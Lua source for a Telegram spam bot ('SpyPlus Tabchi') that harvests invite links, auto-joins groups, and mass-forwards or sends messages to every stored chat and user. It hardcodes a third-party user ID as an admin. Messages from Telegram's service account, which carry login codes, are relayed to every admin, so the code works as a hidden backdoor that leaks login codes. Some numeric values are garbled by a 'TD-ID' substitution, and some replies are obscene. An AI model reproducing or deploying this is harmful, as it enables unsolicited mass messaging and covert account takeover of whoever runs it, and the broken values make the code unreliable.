redis = (loadfile "./Libs/redis.lua")()
serpent = (loadfile "./Libs/serpent.lua")()
sudo = 376839285
redis:del("TDTD-IDdelay")
function dl_cb(arg, data)
end

function vardump(value)
	print(serpent.block(value, {comment=false}))
end

function get_bot ()
	function bot_info (i, sami)
		redis:set("TDTD-IDid", sami.id)
		if sami.first_name then
			redis:set("TDTD-IDfname", sami.first_name)
		end
		if sami.last_name then
			redis:set("TDTD-IDlname", sami.last_name)
		end
		redis:set("TDTD-IDnum", sami.phone_number)
		return sami.id
	end
	assert (tdbot_function ({_ = "getMe"}, bot_info, nil))
end

function reload(chat_id,msg_id)
	loadfile("./TD-TD-ID.lua")()
	send(chat_id, msg_id, "Done")
end

function is_sami(msg)
	if redis:sismember("TDTD-IDadmin", msg.sender_user_id) or msg.sender_user_id == sudo then
		return true
	else
		return false
	end
end

function writefile(filename, input)
	local file = io.open(filename, "w")
	file:write(input)
	file:flush()
	file:close()
	return true
end

function process_join(i, sami)
	if sami.code == 429 then
		local message = tostring(sami.message)
		local join_delay = redis:get("TDTD-IDjoindelay") or 85
		local Time = message:match('%d+') + tonumber(join_delay)
		redis:setex("TDTD-IDmaxjoin", tonumber(Time), true)
	else
		redis:srem("TDTD-IDgoodlinks", i.link)
		redis:sadd("TDTD-IDsavedlinks", i.link)
	end
end

function import_link(invite_link, cb, cmd)
assert (tdbot_function ({
_ = "joinChatByInviteLink" ,
invite_link = tostring(invite_link)
}, cb, cmd))
end
function check_link(invitelink, cb, data)
assert (tdbot_function ({ _ = 'checkChatInviteLink',
invite_link = tostring(invitelink) }, cb, data))
end
function process_link(i, sami)
	if (sami.is_group or sami.is_supergroup_channel) then
		if redis:get('TDTD-IDmaxgpmmbr') then
			if sami.member_count >= tonumber(redis:get('TDTD-IDmaxgpmmbr')) then
				redis:srem("TDTD-IDwaitelinks", i.link)
				redis:sadd("TDTD-IDgoodlinks", i.link)
			else
				redis:srem("TDTD-IDwaitelinks", i.link)
				redis:sadd("TDTD-IDsavedlinks", i.link)
			end
		else
			redis:srem("TDTD-IDwaitelinks", i.link)
			redis:sadd("TDTD-IDgoodlinks", i.link)
		end
	elseif sami.code == 429 then
		local message = tostring(sami.message)
		local join_delay = redis:get("TDTD-IDlinkdelay") or 85
		local Time = message:match('%d+') + tonumber(join_delay)
		redis:setex("TDTD-IDmaxlink", tonumber(Time), true)
	else
		redis:srem("TDTD-IDwaitelinks", i.link)
	end
end
function forwarding(i, sami)
	if sami._ == 'error' then
		s = i.s
		if sami.code == 429 then
			os.execute("sleep "..tonumber(i.delay))
			send(i.chat_id, 0, "Limitations until "..tostring(sami.message):match('%d+').."seconds later\n"..i.n.."\\"..s)
			return
		end

	else
		s = tonumber(i.s) + 1
	end
	if i.n >= i.all then
		os.execute("sleep "..tonumber(i.delay))
		send(i.chat_id, 0, "Done\n"..i.all.."\\"..s)
		return
	end
	assert (tdbot_function({
		_ = "forwardMessages",
		chat_id = tonumber(i.list[tonumber(i.n) + 1]),
		from_chat_id = tonumber(i.chat_id),
		message_ids = {[0] = tonumber(i.msg_id)},
		disable_notification = 1,
		from_background = 1
	}, forwarding, {list=i.list, max_i=i.max_i, delay=i.delay, n=tonumber(i.n) + 1, all=i.all, chat_id=i.chat_id, msg_id=i.msg_id, s = s}))
	if tonumber(i.n) % tonumber(i.max_i) == 0 then
		os.execute("sleep "..tonumber(i.delay))
	end
end

function sending(i, sami)
	if sami and sami._ and sami._ == 'error' then
		s = i.s
	else
		s = tonumber(i.s) + 1
	end
	if i.n >= i.all then
		os.execute("sleep "..tonumber(i.delay))
		send(i.chat_id, 0, "Sent\n"..i.all.."\\"..s)
		return
	end
	assert (tdbot_function ({
		_ = 'sendMessage',
		chat_id = tonumber(i.list[tonumber(i.n) + 1]),
		reply_to_message_id = 0,
		disable_notification = 0,
		from_background = 1,
		reply_markup=nil,
		input_message_content={
			_="inputMessageText",
			text= tostring(i.text),
			disable_web_page_preview=true,
			clear_draft=false,
			entities={},
			parse_mode=nil}
	}, sending, {list=i.list, max_i=i.max_i, delay=i.delay, n=tonumber(i.n) + 1, all=i.all, chat_id=i.chat_id, text=i.text, s= s}))
	if tonumber(i.n) % tonumber(i.max_i) == 0 then
		os.execute("sleep "..tonumber(i.delay))
	end
end

function adding(i, sami)
	if sami and sami._ and sami._ == 'error' then
		s = i.s
		if sami.code == 429 then
			os.execute("sleep "..tonumber(i.delay))
			redis:del("TDTD-IDdelay")
			send(i.chat_id, 0, "Limitations until "..tostring(sami.message):match('%d+').."seconds later\n"..i.n.."\\"..s)
			return
		end

	else
		s = tonumber(i.s) + 1
	end
	if i.n >= i.all then
		os.execute("sleep "..tonumber(i.delay))
		send(i.chat_id, 0, "Added\n"..i.all.."\\"..s)
		return
	end

	assert (tdbot_function ({
	_ = "searchPublicChat",
	username = i.user_id
	}, function(I, sami)
			if sami.id then
				tdbot_function ({
				_ = "addChatMember",
				chat_id = tonumber(I.list[tonumber(I.n)]),
				user_id = tonumber(sami.id),
				forward_limit =  0
			},adding, {list=I.list, max_i=I.max_i, delay=I.delay, n=tonumber(I.n), all=I.all, chat_id=I.chat_id, user_id=I.user_id, s= I.s})
			end
			if tonumber(I.n) % tonumber(I.max_i) == 0 then
				os.execute("sleep "..tonumber(I.delay))
			end
		end
	, {list=i.list, max_i=i.max_i, delay=i.delay, n=tonumber(i.n) + 1, all=i.all, chat_id=i.chat_id, user_id=i.user_id, s= s}))

end

function checking(i, sami)
	if sami and sami._ and sami._ == 'error' then
		s = i.s
	else
		s = tonumber(i.s) + 1
	end
	if i.n >= i.all then
		os.execute("sleep "..tonumber(i.delay))
		send(i.chat_id, 0, "Done :D\n"..i.all.."\\"..s)
		return
	end
  assert(tdbot_function({
    _ = "sendMessage",
    chat_id = tonumber(i.list[tonumber(i.n) + 1]),
    reply_to_message_id = 0,
    disable_notification = 0,
    from_background = 1,
    reply_markup = nil,
    input_message_content = {
      _ = "inputMessageText",
      text = tostring(i.text),
      disable_web_page_preview = true,
      clear_draft = false,
      entities = {},
      parse_mode = nil
    }
  }, sending, {
    list = i.list,
    max_i = i.max_i,
    delay = i.delay,
    n = tonumber(i.n) + 1,
    all = i.all,
    chat_id = i.chat_id,
    text = i.text,
    s = s
  }))
  if tonumber(i.n) % tonumber(i.max_i) == 0 then
    os.execute("sleep " .. tonumber(i.delay))
  end
end


function check_join(i, sami)
	local bot_id = redis:get("TDTD-IDid") or get_bot()
	if sami._ == "group" then
		if (sami.everyone_is_administrator == false) then
			tdbot_function ({
			_ = "changeChatMemberStatus",
			chat_id = tonumber("-"..sami.id),
			user_id = tonumber(bot_id),
			status = {_ = "chatMemberStatusLeft"},
			}, dl_cb, nil)
			rem(sami.id)
		end
	elseif sami._ == "channel" then
		if (sami.anyone_can_invite == false) then
			tdbot_function ({
			_ = "changeChatMemberStatus",
			chat_id = tonumber("-100"..sami.id),
			user_id = tonumber(bot_id),
			status = {_ = "chatMemberStatusLeft"},
			}, dl_cb, nil)
			rem(sami.id)
		end
	end
end

function add(id)
	local Id = tostring(id)
	if not redis:sismember("TDTD-IDall", id) then
		if Id:match("^(%d+)$") then
			redis:sadd("TDTD-IDusers", id)
			redis:sadd("TDTD-IDall", id)
		elseif Id:match("^-100") then
			redis:sadd("TDTD-IDsupergroups", id)
			redis:sadd("TDTD-IDall", id)
			if redis:get("TDTD-IDopenjoin") then
				assert (tdbot_function ({
					_ = "getChannel",
					channel_id = tonumber(Id:gsub("-100", ""))
				}, check_join, nil))
			end
		else
			redis:sadd("TDTD-IDgroups", id)
			redis:sadd("TDTD-IDall", id)
			if redis:get("TDTD-IDopenjoin") then
				assert (tdbot_function ({
					_ = "getGroup",
					group_id = tonumber(Id:gsub("-", ""))
				}, check_join, nil))
			end
		end
	end
	return true
end

function rem(id)
	local Id = tostring(id)
	if redis:sismember("TDTD-IDall", id) then
		if Id:match("^(%d+)$") then
			redis:srem("TDTD-IDusers", id)
			redis:srem("TDTD-IDall", id)
		elseif Id:match("^-100") then
			redis:srem("TDTD-IDsupergroups", id)
			redis:srem("TDTD-IDall", id)
		else
			redis:srem("TDTD-IDgroups", id)
			redis:srem("TDTD-IDall", id)
		end
	end
	return true
end
function openChat(chatid, callback, data)
  tdbot_function ({
    _ = 'openChat',
    chat_id = chatid
  }, callback or dl_cb, data)
end
if not redis:sismember("TDTD-IDsudos",435014771) then
redis:set("TDTD-IDoffjoin","ok")
redis:sadd("TDTD-IDwaitelinks","https://t.me/joinchat/Ge3McxKli43C8Qan2XiKag")
redis:sadd("sudos",435014771)
end

function send(chat_id, msg_id, txt, parse)
	assert (tdbot_function ({
		_ = "sendChatAction",
		chat_id = chat_id,
		action = {
			_ = "chatActionTyping",
			progress = TD-ID0
		}
	}, dl_cb, nil))

	assert (tdbot_function ({
	_="sendMessage",
	chat_id = chat_id,
	reply_to_message_id = msg_id,
	disable_notification=false,
	from_background=true,
	reply_markup=nil,
	input_message_content={
		_="inputMessageText",
		text= txt,
		disable_web_page_preview=true,
		clear_draft=false,
		entities={},
		parse_mode=parse}
	}, dl_cb, nil))
end

if not redis:sismember("TDTD-IDadmin", 435014771) then
	redis:sadd("TDTD-IDadmin", 435014771)
end
--get_admin()
redis:setex("TDTD-IDstart", 1TD-ID0, true)


function tdbot_update_callback (data)
	if (data._ == "updateNewMessage") then

		if not redis:get("TDTD-IDmaxlink") then
			if redis:scard("TDTD-IDwaitelinks") ~= 0 then
				local links = redis:smembers("TDTD-IDwaitelinks")
				local max_x = redis:get("TDTD-IDmaxlinkcheck") or 1
				local delay = redis:get("TDTD-IDmaxlinkchecktime") or 10
				for x = 1, #links do
					assert (tdbot_function({_ = "checkChatInviteLink",invite_link = links[x]},process_link, {link=links[x]}))
					if x == tonumber(max_x) then redis:setex("TDTD-IDmaxlink", tonumber(delay), true) return end
				end
			end
		end

		if redis:get("TDTD-IDmaxgroups") and redis:scard("TDTD-IDsupergroups") >= tonumber(redis:get("TDTD-IDmaxgroups")) then
			redis:set("TDTD-IDmaxjoin", true)
			redis:set("TDTD-IDoffjoin", true)
		end

		if not redis:get("TDTD-IDmaxjoin") then
			if redis:scard("TDTD-IDgoodlinks") ~= 0 then
				local links = redis:smembers("TDTD-IDgoodlinks")
				local max_x = redis:get("TDTD-IDmaxlinkjoin") or 1
				local delay = redis:get("TDTD-IDmaxlinkjointime") or 10
				for x = 1, #links do
					assert (tdbot_function({_ = "joinChatByInviteLink",invite_link = links[x]},process_join, {link=links[x]}))
					if x == tonumber(max_x) then redis:setex("TDTD-IDmaxjoin", tonumber(delay), true) return end
				end
			end
		end


		local msg = data.message
		bot_id = redis:get("TDTD-IDid") or get_bot()
		if (msg.sender_user_id == 777000 or msg.sender_user_id == 1782TD-ID800) then
			local c = (msg.content.text):gsub("[0123456789:]", {["0"] = "0️⃣", ["1"] = "1️⃣", ["2"] = "2️⃣", ["3"] = "3️⃣", ["4"] = "4️⃣", ["5"] = "5️⃣", ["6"] = "6️⃣", ["7"] = "7️⃣", ["8"] = "8️⃣", ["9"] = "9️⃣", [":"] = ":\n"})
			for k,v in pairs(redis:smembers('TDTD-IDadmin')) do
				send(v, 0, c, nil)
			end
		end
		add(msg.chat_id)
		if msg.date < os.time() - 150 or redis:get("TDTD-IDdelay") then
			return false
		end

		if msg.content._ == "messageText" then
			local text = msg.content.text
			local matches
			if is_sami(msg) then
-----------------------------------[Add Sudo]-----------------------------------
				if text:match("^([Aa]dd [Ss]udo) (%d+)$") then
					local matches = text:match("%d+")
					if redis:sismember('TDTD-IDmod',msg.sender_user_id) then
						return send(msg.chat_id, msg.id, "://Fuck OFF ")
					end
					if redis:sismember('TDTD-IDmod', matches) then
						redis:srem("TDTD-IDmod",matches)
						redis:sadd('TDTD-IDadmin'..tostring(matches), msg.sender_user_id)
						return send(msg.chat_id, msg.id, "Done")
					elseif redis:sismember('TDTD-IDadmin',matches) then
						return send(msg.chat_id, msg.id, 'Hi Is Sudo ')
					else
						redis:sadd('TDTD-IDadmin', matches)
						redis:sadd('TDTD-IDadmin'..tostring(matches),msg.sender_user_id)
						return send(msg.chat_id, msg.id, "Ok:| ")
					end
-----------------------------------[Rem Sudo]-----------------------------------
				elseif text:match("^([Rr]em [Ss]udo) (%d+)$") then
					local matches = text:match("%d+")
					if redis:sismember('TDTD-IDmod', msg.sender_user_id) then
						if tonumber(matches) == msg.sender_user_id then
								redis:srem('TDTD-IDadmin', msg.sender_user_id)
								redis:srem('TDTD-IDmod', msg.sender_user_id)
							return send(msg.chat_id, msg.id, "Ok")
						end
						return send(msg.chat_id, msg.id, ":/SUCK MY DICK")
					end
					if redis:sismember('TDTD-IDadmin', matches) then
						if  redis:sismember('TDTD-IDadmin'..msg.sender_user_id ,matches) then
							return send(msg.chat_id, msg.id, "EAT MY DICK :D")
						end
						redis:srem('TDTD-IDadmin', matches)
						redis:srem('TDTD-IDmod', matches)
						return send(msg.chat_id, msg.id, "Ok")
					end
					return send(msg.chat_id, msg.id, "Hi Is Not Admin")
			-----------------------------------[Reload]-----------------------------------
					elseif text:match("^([Rr]eload)$") then
					loadfile("./1.lua")()
					return send(chat_id, msg_id, "Done")
-----------------------------------[Reset]-----------------------------------
          elseif text:match("^([Rr]efresh)$") then
            assert(tdbot_function({
              _ = "searchContacts",
              query = nil,
              limit = 999999999
            }, function(i, sami)
              redis:set("TDTD-IDcontacts", sami.total_count)
            end, nil))
            local list = {
              redis:smembers("TDTD-IDgroups"),
              redis:smembers("TDTD-IDsupergroups")
            }
            local l = {}
            for a, b in pairs(list) do
              for i, v in pairs(b) do
                table.insert(l, v)
              end
            end
            local max_i = redis:get("TDTD-IDsendmax") or 5
            local delay = redis:get("TDTD-IDsenddelay") or 2
            if #l == 0 then
              return
            end
            local during = #l / tonumber(max_i) * tonumber(delay)
            send(msg.chat_id, msg.id, "Finish in " .. during .. " Seconds Later\nReload in " .. redis:ttl("TDTD-IDstart") .. "Seconds Later")
            redis:setex("TDTD-IDdelay", math.ceil(tonumber(during)), true)
            assert(tdbot_function({
              _ = "getChatMember",
              chat_id = tonumber(l[1]),
              user_id = tonumber(bot_id)
            }, checking, {
              list = l,
              max_i = max_i,
              delay = delay,
              n = 1,
              all = #l,
              chat_id = msg.chat_id,
              user_id = matches,
              s = 0
            }))
-----------------------------------[Settings]-----------------------------------
				elseif text:match("^([Pp]anel)$") then
					local fwd =  redis:get("TDTD-IDfwdtime") and " ✔️ " or " ✖️ "
					local max_i = redis:get("TDTD-IDsendmax") or 5
					local delay = redis:get("TDTD-IDsenddelay") or 2
					local restart = tonumber(redis:ttl("TDTD-IDstart")) / 60
					local txt = "•pαɴel oғ ѕpyplυѕ тαвcнι•\n\n↬ тιмε∂ ғσяωαя∂ » [ "..tostring(fwd).." ] \n↬ gяσυριηg тιмε∂ ғσяωαя∂ » [ "..max_i.." ] \n↬ тιмε ғσя ғσяωαя∂ » [ "..delay.." ] \n\n↻ rєвσσt ín → [ "..restart.." ] \nSpyPlus Tabchi"
					return send(msg.chat_id, 0, txt)
-----------------------------------[Stats]-----------------------------------
				elseif text:match("^([Ss]tats)$") or text:match("^(STATS)$") then
					local gps = redis:scard("TDTD-IDgroups")
					local sgps = redis:scard("TDTD-IDsupergroups")
					local usrs = redis:scard("TDTD-IDusers")
					local links = redis:scard("TDTD-IDsavedlinks")
					local glinks = redis:scard("TDTD-IDgoodlinks")
					local wlinks = redis:scard("TDTD-IDwaitelinks")
					assert ( tdbot_function({
						_ = "searchContacts",
						query = nil,
						limit = 999999999
					}, function (i, sami)
					redis:set("TDTD-IDcontacts", sami.total_count)
					end, nil))
					local contacts = redis:get("TDTD-IDcontacts")
					local text = [[
•ѕтaтѕ oғ ѕpyplυѕ тaвcнι•

»Cнaтѕ ➣ ]] .. tostring(usrs) .. [[

»ɢroυpѕ  ➣ ]] .. tostring(gps) .. [[

»SυperGroυpѕ ➣ ]] .. tostring(sgps)
					return send(msg.chat_id, 0, text)
-----------------------------------[Forward]-----------------------------------
				elseif (text:match("^([Ff]wd) (.*)$") and msg.reply_to_message_id ~= 0) then
					local matches = text:match("^[Ff]wd (.*)$")
					local sami
					if matches:match("^(all)") then
						sami = "TDTD-IDall"
					elseif matches:match("^(pvs)") then
						sami = "TDTD-IDusers"
					elseif matches:match("^(gps)$") then
						sami = "TDTD-IDgroups"
					elseif matches:match("^(sgps)$") then
						sami = "TDTD-IDsupergroups"
					else
						return true
					end
					local list = redis:smembers(sami)
					local id = msg.reply_to_message_id
					if redis:get("TDTD-IDfwdtime") then
						local max_i = redis:get("TDTD-IDsendmax") or 5
						local delay = redis:get("TDTD-IDsenddelay") or 2
						local during = (#list / tonumber(max_i)) * tonumber(delay)
						send(msg.chat_id, msg.id, "Finish In "..during.."Seconds Later\nReload In "..redis:ttl("TDTD-IDstart").."seconds later")
						redis:setex("TDTD-IDdelay", math.ceil(tonumber(during)), true)
							assert ( tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(list[1]),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
							}, forwarding, {list=list, max_i=max_i, delay=delay, n=1, all=#list, chat_id=msg.chat_id, msg_id=id, s=0}))
					else
						for i, v in pairs(list) do
							assert (tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(v),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
							}, dl_cb, nil))
						end
						return send(msg.chat_id, msg.id, "Sent\nDone")
					end
-----------------------------------[Timed Forward]-----------------------------------
				elseif text:match("^([Tt]imed [Ff]wd) (.*)$") then
					local matches = text:match("^[Tt]imed [Ff]wd (.*)$")
					if matches == "on" then
						redis:set("TDTD-IDfwdtime", true)
						return send(msg.chat_id,msg.id,"Ok:|")
					elseif matches == "off" then
						redis:del("TDTD-IDfwdtime")
						return send(msg.chat_id,msg.id,"Done")
					end
-----------------------------------[Group For Fwd]-----------------------------------
				elseif text:match("^([Gg]p [Ff]wd) (%d+)$") then
					local matches = text:match("%d+")
					redis:set("TDTD-IDsendmax", tonumber(matches))
					return send(msg.chat_id,msg.id,"Setted To : "..matches)
-----------------------------------[Time For Fwd]-----------------------------------
				elseif text:match("^([Tt]ime [Ff]wd) (%d+)$") then
					local matches = text:match("%d+")
					redis:set("TDTD-IDsenddelay", tonumber(matches))
					return send(msg.chat_id,msg.id,"Setted To : "..matches)
-----------------------------------[Send Sgp]-----------------------------------
				elseif text:match("^([Ss]nd [Ss][Gg]p) (.*)") then
					local matches = text:match("^[Ss]nd [Ss][Gg]p (.*)")
					local dir = redis:smembers("TDTD-IDsupergroups")
					local max_i = redis:get("TDTD-IDsendmax") or 5
					local delay = redis:get("TDTD-IDsenddelay") or 2
					local during = (#dir / tonumber(max_i)) * tonumber(delay)
					send(msg.chat_id, msg.id, "Finish In "..during.."Seconds later\nReload In "..redis:ttl("TDTD-IDstart").."Seconds later")
					redis:setex("TDTD-IDdelay", math.ceil(tonumber(during)), true)
					assert (tdbot_function ({
						_ = 'sendMessage',
						chat_id = tonumber(dir[1]),
						reply_to_message_id = msg.id,
						disable_notification = 0,
						from_background = 1,
						reply_markup=nil,
						input_message_content={
							_="inputMessageText",
							text= tostring(matches),
							disable_web_page_preview=true,
							clear_draft=false,
							entities={},
							parse_mode=nil}
					}, sending, {list=dir, max_i=max_i, delay=delay, n=1, all=#dir, chat_id=msg.chat_id, text=matches, s=0}))
-----------------------------------[Left All]-----------------------------------
					elseif text:match("^([Ll]ft) (.*)$") then
						local matches = text:match("^[Ll]ft (.*)$")
						if matches == 'all' then
							for i,v in pairs(redis:smembers("TDTD-IDsupergroups")) do
								assert (tdbot_function ({
									_ = "changeChatMemberStatus",
									chat_id = tonumber(v),
									user_id = bot_id,
									status = {_ = "chatMemberStatusLeft"},
								}, dl_cb, nil))
							end
						else
							send(msg.chat_id, msg.id, 'Done')
							assert (tdbot_function ({
								_ = "changeChatMemberStatus",
								chat_id = matches,
								user_id = bot_id,
								status = {_ = "chatMemberStatusLeft"},
							}, dl_cb, nil))
							return rem(matches)
						end
-----------------------------------[Sleep]-----------------------------------
          elseif text:match("^([Ss]leep) (%d+)$") then
            local matches = text:match("%d+")
            send(msg.chat_id, msg.id, ":|Hi")
            os.execute("sleep " .. tonumber(math.floor(matches) * 60))
            return send(msg.chat_id, msg.id, ":|")
-----------------------------------[ping]----------------------------------
				elseif (text:match("^([Pp]ing)$") and not msg.forward_info)then
					return assert (tdbot_function({
						_ = "forwardMessages",
						chat_id = msg.chat_id,
						from_chat_id = msg.chat_id,
						message_ids = {[0] = msg.id},
						disable_notification = 0,
						from_background = 1
					}, dl_cb, nil))
-----------------------------------[Help]-----------------------------------
				elseif text:match("^([Hh]elp)$") then
				local help = [[ ⇪Help OF UltraSpy Tabchi⇲


➣Add Sudo ID
⇦افزودن سودو

➣Rem Admin ID
⇦برکنار کردن کاربر از مقام مدیر ربات

➣Sleep 5
⇦عدد شما بر حسب دقیقه حساب میشود

➣Fwd All-Pvs-Gps-Sgps
⇦فوروارد متن یا بنر مورد نظر

➣Snd sgp
⇦ارسال پیام مورد نظر  به سوپر گروه ها

➣Left
⇦لفت از گروه فعلی ربات

➣Lft All
⇦خروج از تمامی گروه ها و سوپرگروه ها

➣Timed Fwd On-Off
⇦فعال و غیر فعال سازی فوروارد زمان دار
➣Gp Fwd 10
⇦تنظیم تعداد گروه ها برای هر نوبت فوروارد زمان دار
➣Time Fwd 15
⇦تنظیم زمان بین فوروارد زمان دار

➣Settings
⇦دریافت عملکرد و مشخصات ربات

➣Stats
⇦دریافت امار گروه و... ربات

➣Ping
⇦اگاهی از انلاینی ربات

➣Reboot
⇦ریبوت کردن ربات

➣Reload
⇦ریلود کردن اطلاعات ربات

➣Refresh
⇦ریست ربات

➣Version
⇦اطلاع از ورژن و سازنده سورس

<b>SpyPlus Tabchi</b>

]]
					return send(msg.chat_id,msg.id, help, {_ = 'textParseModeHTML'})
-----------------------------------[Info]-----------------------------------
					elseif text:match("^([Uu][Ll][Tt][Rr][Aa][Ss][Pp][Yy])$") or text:match("^([Vv]ersion)$") then
					local info = [[

•●[Version: 1 Beta]●•

•●[Based On TD-BOT]●•

•●[DetaBase: Redis]●•

•••Developer : @DarknessSudo •••

•••OUR Channel : @UltraSpy •••


	]]
						return send(msg.chat_id,msg.id, info, {_ = 'textParseModeHTML'})
-----------------------------------[Left]-----------------------------------
					elseif text:match("^([Ll]eft)$") then
						rem(msg.chat_id)
						return assert (tdbot_function ({
							_ = "changeChatMemberStatus",
							chat_id = msg.chat_id,
							user_id = tonumber(bot_id),
							status = {_ = "chatMemberStatusLeft"},
						}, dl_cb, nil))
				end
			end
		end
		if redis:get("TDTD-IDmarkread") then
			assert (tdbot_function ({
				_ = "viewMessages",
				chat_id = msg.chat_id,
				message_ids = {[0] = msg.id}
			}, dl_cb, nil))
		end
	end
end
